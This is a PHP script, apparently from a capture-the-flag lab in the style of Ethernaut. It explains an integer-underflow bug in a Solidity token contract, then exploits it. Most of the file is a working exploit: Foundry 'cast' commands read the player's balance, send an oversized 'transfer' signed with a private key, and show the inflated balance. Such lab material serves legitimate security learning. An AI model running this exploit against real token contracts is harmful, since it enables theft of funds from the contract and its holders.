<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
<b>Why Token.sol is vulnerable?</b>

The line:
    require(balances[msg.sender] - _value >= 0);

is broken in Solidity <0.8 because subtraction is NOT checked.

If sender has 0 tokens and tries sending 1:

    0 - 1 = 2^256 - 1 (max uint256)

So the check passes and attacker gets huge balance.

This script demonstrates that exploit.
</pre>

<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "Contract: $CONTRACT\n";
echo "Player Index: $PLAYER_ID\n";
echo "Player Address: $PLAYER\n";


echo "\n=== BALANCE BEFORE ===\n";
echo cast("cast call $CONTRACT \"balanceOf(address)\" $PLAYER --rpc-url $RPC");

echo "\n=== TOTAL SUPPLY ===\n";
echo cast("cast call $CONTRACT \"totalSupply()\" --rpc-url $RPC");

// ---------------------------------------------------------------
// EXECUTE EXPLOIT
// ---------------------------------------------------------------
echo "\n=== EXECUTING INTEGER UNDERFLOW EXPLOIT ===\n";

$huge = "100000000000000000000000000000000000000";

echo cast(
    "cast send $CONTRACT \"transfer(address,uint256)\" $PLAYER $huge " .
    "--rpc-url $RPC --private-key $PK"
);

// ---------------------------------------------------------------
// SHOW BALANCES AFTER
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== BALANCE AFTER EXPLOIT ===
</div>";

echo cast("cast call $CONTRACT \"balanceOf(address)\" $PLAYER --rpc-url $RPC");

echo "\n=== CONTRACT BALANCE ===\n";
echo cast("cast balance $CONTRACT --rpc-url $RPC");

echo "</pre>";
?>
